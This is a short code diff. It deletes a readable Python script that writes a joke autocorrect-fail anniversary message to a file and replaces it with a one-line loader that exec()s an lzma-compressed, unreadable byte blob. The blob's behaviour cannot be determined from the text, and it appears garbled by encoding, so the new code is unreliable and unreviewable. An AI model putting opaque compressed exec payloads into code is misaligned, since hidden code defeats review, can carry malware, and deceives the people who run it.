@@ -1,18 +1,2 @@
-#!/usr/bin/env python3
-"""Write the Funniest Autocorrect Fail entry to entry.txt."""
-
-import os
-
-TEXT = "Happy anniversary! Twenty years together and I still choose you every single dad"
-
-
-def main() -> None:
-    output_dir = os.environ.get("MAKEFUN_OUTPUT_DIR") or "/output"
-    os.makedirs(output_dir, exist_ok=True)
-    path = os.path.join(output_dir, "entry.txt")
-    with open(path, "w", encoding="utf-8") as f:
-        f.write(TEXT)
-
-
-if __name__ == "__main__":
-    main()
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0\0\0\0\0\0\0\x004œ%Å¯^´ÍƒßÅ©çÊ·Ò‰.{ç,y³@¬Ü}ÿ-%Á}oñc¬Ì5á¼7gReÕi1)T¯’½$oš)&fê§¦qÁLxWSìæ!ü\'±Ù<r›9şïÔŒR‘ÍÕ„b‘øB<$8ÄÒ;ac,ß±IÓÂ•ÓÍ¹Me‘ùİ"r3QˆÑâ¨ÖâÙlÒÒ@)„Àÿª!²39òl£Ï×¸Õ°Vş¨¹0ŒôæùÉlÏ)ZAÍlë>“üCTÄã7VwKy>¯ KÇ;V|íÂ‡¬è(î[<ÀIšÜç®ëO vt(N‰°Y}{Êõ3Mn4á-RËXğbL_önÀÑm‘3²–ıøXÕ©+Fñ]IA3CŞ¦ÏNêï§¤&o1ÀŞfp«e‚?÷lM×\'Õ‹zN¸ä|¬ë˜Â'.encode('l1')))
